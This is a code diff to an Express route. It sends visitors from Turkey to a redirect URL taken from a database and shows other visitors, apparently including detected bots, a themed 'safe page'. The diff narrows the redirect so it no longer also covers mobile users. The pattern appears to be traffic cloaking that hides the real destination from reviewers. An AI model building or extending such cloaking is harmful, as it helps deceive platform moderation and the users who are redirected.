@@ -140,14 +140,14 @@ app.get('/', async (req, res) => {
     return res.sendFile(path.join(__dirname, 'public', 'themes', `${theme}.html`));
   }
   
-  if (country === 'TR' || isMobile) {
+  if (country === 'TR') {
     const activeConfig = await db.getActiveRedirectUrl();
-    console.log(`Redirecting TR/Mobile user to: ${activeConfig.url}`);
+    console.log(`Redirecting TR user (${isMobile ? 'Mobile' : 'Desktop'}) to: ${activeConfig.url}`);
     db.logVisitor({ ip, country, userAgent, isBot, isMobile, action: 'redirected' });
     return res.redirect(activeConfig.url);
   }
   
-  console.log('Regular visitor - showing themed safe page');
+  console.log(`Foreign visitor (${country}) - showing themed safe page`);
   const activeConfig = await db.getActiveRedirectUrl();
   const theme = activeConfig.theme || 'business';
   db.logVisitor({ ip, country, userAgent, isBot, isMobile, action: 'safe_page_shown' });
